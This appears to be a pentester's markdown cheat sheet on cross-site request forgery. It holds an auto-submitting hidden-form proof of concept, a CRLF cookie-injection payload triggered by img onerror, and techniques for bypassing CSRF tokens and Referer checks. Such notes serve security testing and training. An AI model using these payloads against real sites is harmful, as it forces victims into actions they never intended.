#### CSRF - Cross-site request forgery

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

---

#### How to construct a CSRF attack

- **No Defense mechanism** 

  generate POC using burpsuite or manually write it 

  `<form method="$method" action="$url">`

  `<input type="hidden" name="$param1name" value="$param1value">`

  `</form>`

  `<script>`

  `   document.forms[0].submit();`   

  `</script>`

- **Validation of CSRF token depends on request method**

  switch to the GET method to bypass the validation and deliver a CSRF attack

- **Validation of CSRF token depends on token being present**

  Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

  TRY TO DELETE IT 

- **CSRF token is not tied to the user session**

  Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

  In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

  

- **If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser**

  inject cookie using this format `/?search=test%0d%0aSet-Cookie:%20csrf=fake`

  make POC work automatically using this 

  `<img src="$cookie-injection-url/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();"/>`

  AND

  - **CSRF token is tied to a non-session cookie**

    contain header like this `csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv`

    we can get valid token from personal account and preform the attack

  - **CSRF token is simply duplicated in a cookie**

    any token in correct format



- **Referer Header exist**
  - **Validation of Referer depends on header being present**

    Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted.

    `<meta name="referrer" content="never">`

  - **Validation of Referer can be circumvented**

    Some applications validate the `Referer` header in a naive way that can be bypassed. For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain:`http://vulnerable-website.com.attacker-website.com/csrf-attack`

    Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL:`http://attacker-website.com/csrf-attack?vulnerable-website.com`

    in this case expoit be like :

    - modify header to be like `Referer: https://arbitrary-incorrect-domain.net?target.net`
    - craft POC and add this script `history.pushState("", "", "/?target.net")`
    - add this to headers `Referrer-Policy: unsafe-url` 

